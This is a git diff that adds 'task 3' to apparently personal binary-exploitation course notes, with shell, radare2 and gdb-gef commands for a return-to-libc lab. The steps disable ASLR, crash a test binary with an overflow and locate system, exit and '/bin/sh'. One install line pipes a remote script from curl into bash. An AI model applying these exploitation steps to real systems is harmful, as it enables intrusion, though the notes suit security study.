@@ -80,3 +80,79 @@ cat eggh.bin| msfvenom -p - -a x86 --platform win
 * https://rastating.github.io/creating-a-custom-shellcode-encoder/
 * https://medium.com/manomano-tech/a-red-team-operation-leveraging-a-zero-day-vulnerability-in-zoom-80f57fb0822e
 * https://www.golem.de/news/csv-import-luca-app-ermoeglichte-code-injection-bei-excel-2105-156787.html
+
+# task 3
+
+```sh
+md5 AAAAAAAA
+# MD5(AAAAAAAA)= 41153e9946e683e15a29766ae0f568f8
+
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+uname -a
+# Linux kali 5.16.0-kali1-amd64 #1 SMP PREEMPT Debian 5.16.7-2kali1 (2022-02-10) x86_64 GNU/Linux
+
+strings AAAAAAAA
+# AAAAAAA.c
+# fflush@@GLIBC_2.2.5
+# __isoc99_scanf@@GLIBC_2.7
+
+python3 -c "print('A'*1000)"|./AAAAAAAA
+# sigsegv
+
+# install ghidra
+#  apt install ghidra
+# install gdb gef
+#  bash -c "$(curl -fsSL http://gef.blah.cat/sh)"
+
+# radare2
+
+cp AAAAAAAA bin
+r2 -dAA bin # -d debug (run app), -AA analyze (aaaa)
+
+# in r2:
+
+iq # simple infos
+ii # list imports
+afll # verbose function list
+afv # list variables in current scope
+
+# r2 starts at 7fcd050 # `starti` in gdb
+db entry0
+db main # break @main
+db # list breakpoints
+Vpp # or V!
+:dc # continue
+g entry0 # goto
+
+s main
+pdf
+s sym.copy
+pdf
+
+###
+# https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+# stack not executable, can't run shellcode from it.
+# point it to system() call in libc instead.
+
+./expl.py # gen payload
+gdb bin
+
+# in gdb gef:
+checksec # nx bit set! stack not executable.
+break *main
+ct # after ctrl-l
+run < payload # use payload content as stdin input.
+break *copy
+continue
+fin # if stepping into function, run until ret
+bt # frame #1 is the next rip
+x/8a $rsp-32 # show stack around $sp
+# or sp alias
+p $rbp # rbp is not the same as bp (longer)
+
+break *copy+34 # ret
+p system
+p exit
+search-pattern '/bin/sh'
+```
